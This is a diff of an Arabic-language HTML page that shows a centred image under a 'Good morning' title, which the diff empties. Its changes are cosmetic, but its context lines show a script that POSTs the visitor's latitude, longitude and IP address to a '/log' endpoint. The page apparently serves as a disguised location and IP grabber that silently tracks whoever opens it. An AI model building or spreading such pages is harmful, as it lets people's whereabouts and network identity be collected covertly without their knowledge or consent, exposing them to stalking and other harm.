@@ -2,8 +2,8 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>صباح الخير</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
   <style>
     body {
       margin: 0;
@@ -11,7 +11,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #f5f5f5;
+      background: #f5f5f5;
     }
     img {
       max-width: 90%;
@@ -28,7 +28,7 @@
       await fetch('/log', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ latitude: lat, longitude: lon, ip: ip })
+        body: JSON.stringify({ latitude: lat, longitude: lon, ip })
       });
     }
 
